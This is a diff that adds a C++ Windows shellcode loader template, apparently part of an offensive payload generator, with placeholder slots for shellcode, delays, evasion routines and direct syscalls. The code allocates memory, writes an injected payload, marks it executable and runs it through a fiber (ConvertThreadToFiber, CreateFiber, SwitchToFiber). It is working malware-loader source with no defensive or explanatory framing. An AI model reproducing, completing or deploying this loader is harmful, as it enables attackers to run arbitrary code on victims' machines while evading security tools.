@@ -1,0 +1,98 @@
+    #include <iostream>
+#include <windows.h>
+#include <psapi.h>
+#include <tlhelp32.h>
+#include <stdlib.h>
+#include <tchar.h>
+
+//####INCLUDE####
+
+//####DEFINE####
+
+//####CODE####
+
+
+DWORD WINAPI esc_main(LPVOID lpParameter)
+{
+    DWORD dwSize;
+    //HANDLE currentProcess;
+
+    unsigned char encoded[] = ####SHELLCODE####;
+    SIZE_T length = sizeof(encoded);
+
+    //unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
+    //memcpy(encoded, raw, length);
+    //SIZE_T bytesWritten;
+
+    //####CALL####
+    unsigned char* decoded = encoded;
+
+
+    //####SYSCALL####  
+    // Prepare variables
+    HANDLE hProc = GetCurrentProcess();
+    PVOID base_addr = NULL;
+    SIZE_T pnew = length;
+    SIZE_T bytesWritten = 0;
+    DWORD oldProtect = 0;
+    NTSTATUS status;
+
+    // Allocate memory for shellcode
+    status = NtAllocateVirtualMemory(hProc, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (status != 0) {
+        std::cerr << "NtAllocateVirtualMemory failed with status: " << std::hex << status << std::endl;
+        return 1;
+    }
+
+    // Write shellcode to allocated memory
+    status = NtWriteVirtualMemory(hProc, base_addr, decoded, pnew, &bytesWritten);
+    if (status != 0) {
+        std::cerr << "NtWriteVirtualMemory failed with status: " << std::hex << status << std::endl;
+        
+    }
+
+    // Change memory protection to executable
+    status = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&pnew, PAGE_EXECUTE_READ, &oldProtect);
+    if (status != 0) {
+        std::cerr << "NtProtectVirtualMemory failed with status: " << std::hex << status << std::endl;
+        return 1;
+    }
+
+    std::cout << "Executing shellcode using Fiber-based execution..." << std::endl;
+
+    // Convert current thread to fiber
+    PVOID MainFiber = ConvertThreadToFiber(NULL);
+    if (!MainFiber) {
+        std::cerr << "ConvertThreadToFiber failed with error: " << GetLastError() << std::endl;
+        return 1;
+    }
+
+    // Create fiber pointing to shellcode
+    PVOID ShellcodeFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)base_addr, NULL);
+    if (!ShellcodeFiber) {
+        std::cerr << "CreateFiber failed with error: " << GetLastError() << std::endl;
+        ConvertFiberToThread();
+        return 1;
+    }
+
+    // Switch to shellcode fiber
+    SwitchToFiber(ShellcodeFiber);
+
+    // Execution returns here after shellcode completes
+    DeleteFiber(ShellcodeFiber);
+    ConvertFiberToThread();
+
+    std::cout << "Execution completed" << std::endl;
+    return 0;
+}
+
+int main()
+{
+    //####DELAY####
+    //####EVASION####
+    //####ARGS####
+
+    esc_main(NULL);
+}
+
+ 
